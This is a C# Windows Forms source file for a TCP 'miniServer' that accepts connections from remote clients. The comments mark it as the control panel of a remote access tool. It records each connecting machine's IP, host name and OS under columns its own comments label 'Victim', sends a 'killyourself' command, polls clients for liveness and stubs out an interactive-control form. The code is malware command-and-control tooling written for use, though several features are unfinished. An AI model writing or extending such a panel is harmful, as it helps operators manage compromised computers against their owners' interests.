using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace miniServer
{
    public partial class ServerForm : Form
    {
        //must be same in client and server.
        const string separator = "|||";
        private static Mutex gridMutex = new Mutex();
        private static Mutex idMutex = new Mutex();

        Thread serverThread;
        TcpListener serverTcp;
        List<miniClient> clientList = new List<miniClient>();


        public ServerForm()
        {
            InitializeComponent();
        }

        private void startToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ButtonStart_Click(sender, e);
        }
        private void StopToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ButtonStop_Click(sender, e);
        }

        private void configToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void ServerForm_Load(object sender, EventArgs e)
        {

        }

        private void aboutToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new AboutBox1().ShowDialog();
        }

        private void exitToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (MessageBox.Show("Are you sure for Exit?", "Exit", MessageBoxButtons.YesNo) != DialogResult.Yes)
            {
                e.Cancel = true;
            }
        }

        private void ButtonStart_Click(object sender, EventArgs e)
        {
            buttonStart.Enabled = false;
            writelog("Server Started", null);
            buttonStop.Enabled = true;

            serverTcp = new TcpListener(IPAddress.Any, (int)numericUpDownPort.Value);
            serverTcp.Start();

            serverThread = new Thread(() =>
            {
                while (true)
                {
                    var tcpClient = serverTcp.AcceptTcpClient();
                    byte[] helloBytes = null;

                    ThreadPool.QueueUserWorkItem(param =>
                    {
                        try
                        {
                            NetworkStream stream = tcpClient.GetStream();
                            byte[] bytes = new byte[4096];
                            int byteread = stream.Read(bytes, 0, bytes.Length);

                            helloBytes = new byte[byteread];
                            Array.Copy(bytes, helloBytes, byteread);

                            string incomming = Encoding.UTF8.GetString(helloBytes);
                            string[] stringSeparators = new string[] { separator };
                            string[] receive = incomming.Split(stringSeparators, StringSplitOptions.RemoveEmptyEntries);
                            //Recived: clientid<separator>osVersion<separator>clientversion<separator>HostName
                            //Recived[0] -> clientid
                            //Recived[1] -> osVersion
                            //Recived[2] -> clientversion
                            //Recived[3] -> HostName
                            if (receive.Length == 4)
                            {
                                //int id = int.Parse(receive[0]);
                                //string hostName = receive[3];

                                //A new client
                                //AddNewClienet(tcpClient, receive[1], receive[2], receive[3], incomming, hostName);
                                AddNewClienet(tcpClient, receive[1], receive[2], receive[3], incomming);
                                return;

                            }
                            else//incorect recive data
                            {
                                writelog(tcpClient.Client.RemoteEndPoint.ToString() + "Connection Hello is incorrect :( ",
                                    string.Format("Error Data={0}\nRecive Data={1} ", incomming, Encoding.UTF8.GetString(helloBytes, 0, byteread)));
                                return;
                            }
                        }
                        catch (Exception ex)
                        {
                            writelog(tcpClient.Client.RemoteEndPoint.ToString() + " Error wile client connecting :( ", ex.Message + "\n" + Encoding.UTF8.GetString(helloBytes, 0, helloBytes.Length));
                            return;
                        }
                    }, null);
                }
            });
            serverThread.IsBackground = true;
            serverThread.Start();
        }

        void AddNewClienet(TcpClient tcpClient, string os, string version, string hostName, string incomming)
        {
            idMutex.WaitOne();
            miniClient mc = new miniClient(clientList.Count, tcpClient, os, version, hostName);
            clientList.Add(mc);
            idMutex.ReleaseMutex();

            //Hello is for future use
            mc.SendToClient(mc.ID.ToString() + separator + "Hello");

            //ADD new client to datagridview
            DataGridViewRow row = new DataGridViewRow();
            row.CreateCells(dataGridViewClients);
            //TODO:IP country Flag
            //row.Cells[0].Value = getFlagOfIP(sc.IP);//IP country Flag
            row.Cells[1].Value = mc.ID;//ID
                                       //Note is emty
            row.Cells[3].Value = mc.IP;//Victim IP and Port
            row.Cells[4].Value = mc.HostName;//Victim HostName
            row.Cells[5].Value = mc.OS;//Victim OS version
            row.Cells[6].Value = mc.Version;//Client Version
            row.Cells[7].Value = "Yes";//isAlive

            gridMutex.WaitOne();
            dataGridViewClients.Invoke((MethodInvoker)delegate
            {
                dataGridViewClients.Rows.Add(row);
            });
            gridMutex.ReleaseMutex();
            writelog(mc.IP + " -> Connected :) : " + incomming, "");
        }

        void writelog(string log, string extradata)
        {


            if (extradata == null)
            {
                richTextBoxLog.Invoke((MethodInvoker)delegate
                {
                    richTextBoxLog.Text += (DateTime.Now.ToString() + " " + log + "\n").Replace(separator, "_");
                });
                return;
            }
            else {
                richTextBoxLog.Invoke((MethodInvoker)delegate
                {
                    richTextBoxLog.Text += (DateTime.Now.ToString() + " " + log + "\n" + extradata + "\n").Replace(separator, "_");
                });
            }

        }

        private void ButtonStop_Click(object sender, EventArgs e)
        {
            buttonStart.Enabled = true;
            buttonStop.Enabled = false;
            serverThread.Abort();
            serverTcp.Stop();
            writelog("Server Stopped.", null);
        }

        private void OpenToolStripMenuItem_Click(object sender, EventArgs e)
        {
            //TODO: open interact form
        }

        private void EditNoteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            //TODO: open edit note form
        }

        private void KillToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (dataGridViewClients.CurrentCell != null)
            {
                int i = (int)dataGridViewClients.CurrentRow.Cells[1].Value;//get id
                if (clientList[i].IsAlive == false)
                {
                    MessageBox.Show("He is dead", "is dead", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    return;
                }

                if (MessageBox.Show("Are U sure to KILL Client process?", "Kill Client", MessageBoxButtons.YesNo, MessageBoxIcon.Hand) == DialogResult.Yes)
                {
                    //Quick and dirty way need to run in thread
                    clientList[i].SendToClient("killyourself");
                    clientList[i].IsAlive = false;
                    dataGridViewClients.CurrentRow.Cells[7].Value = "False";//update data grid
                }
            }
        }

        private void ButtonRefreshClientList_Click(object sender, EventArgs e)
        {
            buttonRefreshClientList.Enabled = false;
            buttonRefreshClientList.Text = "Wait";

            Thread check = new Thread(() => checkLives());
            check.IsBackground = true;
            check.Start();
        }

        private void checkLives()
        {
            List<Thread> tArray = new List<Thread>();
            foreach (miniClient mc in clientList)
            {
                Thread t = new Thread(() => checkClientIsAlive(mc));
                t.IsBackground = true;
                t.Start();
                tArray.Add(t);
            }
            foreach (Thread t in tArray)
            {
                t.Join();
            }

            buttonRefreshClientList.Invoke((MethodInvoker)delegate
            {
                buttonRefreshClientList.Enabled = true;
                buttonRefreshClientList.Text = "";
            });


        }

        private void checkClientIsAlive(miniClient mc)
        {
            if (mc.client.Client.Connected && !mc.Interact)
            {
                try
                {
                    mc.Recivedata = "";

                    //Write a command
                    mc.SendToClient("version");

                    //waiting 30 sec for the response to be prepared
                    int wait = 0;
                    while (wait < 30)
                    {
                        if (mc.Recivedata != "")
                        {
                            mc.Recivedata = "";
                            return;
                        }
                        Thread.Sleep(1000);
                        wait++;
                    }
                    throw new Exception(" Don't response to version command.");
                }catch(Exception ex)
                {
                    mc.IsAlive = false;
                    mc.client.Close();

                    gridMutex.WaitOne();
                    dataGridViewClients.Invoke((MethodInvoker)delegate
                    {
                        dataGridViewClients["live", mc.ID].Value = "NO";
                    });
                    gridMutex.ReleaseMutex();

                    richTextBoxLog.Invoke((MethodInvoker)delegate
                    {
                        richTextBoxLog.Text += String.Format("Client {0}: {1}\n",
                            mc.ID.ToString(), ex.Message);
                    });
                }
            }
        }
    }
}
